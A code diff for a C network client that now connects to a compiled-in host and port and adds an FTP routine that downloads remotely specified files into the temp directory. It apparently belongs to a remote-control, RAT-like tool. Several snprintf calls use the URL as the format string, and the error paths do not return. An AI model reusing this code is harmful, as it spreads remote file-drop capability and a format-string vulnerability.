@@ -9,6 +9,9 @@
 #include "../utils/logging.h"
 #include "../utils/processes.h"
 #include "../utils/information.h"
+#include "../utils/ftp.h"
+
+#define FTP_ERR_FMT "[!][%i] Could not download %s"
 
 void downloadFile(char buffer[BUF_SIZE], char *URL);
 void uploadFile(char buffer[BUF_SIZE], char *URL);
@@ -50,9 +53,27 @@ void uploadFile(char buffer[BUF_SIZE], char *URL)
 {
     snprintf(buffer, BUF_SIZE, URL);
 }
+
 void downloadFile(char buffer[BUF_SIZE], char *URL)
 {
-    snprintf(buffer, BUF_SIZE, URL);
+    char filePath[BUF_SIZE];
+    DWORD pathLen;
+    if (!(getTempDir(filePath, &pathLen)))
+    {
+        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 1, URL);
+    }
+    snprintf(filePath + strlen(filePath), BUF_SIZE - strlen(filePath), getBasename(URL));
+    HINTERNET ftpHandle = createFtpHandle(FTP_SERVER, FTP_USER, FTP_PASS);
+    if (!ftpHandle)
+    {
+        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 2, URL);
+    }
+    int result = downloadFileFtp(&ftpHandle, URL, filePath);
+    if (result != 0)
+    {
+        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, result + 2, URL);
+    }
+    snprintf(buffer, BUF_SIZE, "[i] Successfully downloaded file into %s", filePath);
 }
 
 int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
@@ -139,22 +160,24 @@ void serverHandler(SOCKET socket)
 int main(void)
 {
     printf("[i] Initializing Client\n");
-    char serverIp[BUF_SIZE], serverPort[BUF_SIZE];
-    getInput("Server IP Address: ", serverIp);
-    getInput("Server Port: ", serverPort);
-    int port = strtol(serverPort, NULL, 0xA);
+    // char serverIp[BUF_SIZE], serverPort[BUF_SIZE];
+    // getInput("[?] Server IP Address: ", serverIp);
+    // getInput("[?] Server Port: ", serverPort);
+    // int port = strtol(serverPort, NULL, 0xA);
 
-    strip(serverIp);
+    // strip(serverIp);
+    char *serverIp = HOST;
+    int serverPort = PORT;
     SOCKET clientSocket = createSocket(AF_INET, SOCK_STREAM, 0);
     if (clientSocket == INVALID_SOCKET)
     {
         exit(10);
     }
-    int error_code = initializeClientSocket(&clientSocket, serverIp, port);
+    int error_code = initializeClientSocket(&clientSocket, serverIp, serverPort);
 
     if (error_code)
     {
-        printf("[E] Could not connect to %s on port %i\n", serverIp, port);
+        printf("[E] Could not connect to %s on port %i\n", serverIp, serverPort);
         printf("[i] Exiting...\n");
     }
     serverHandler(clientSocket);
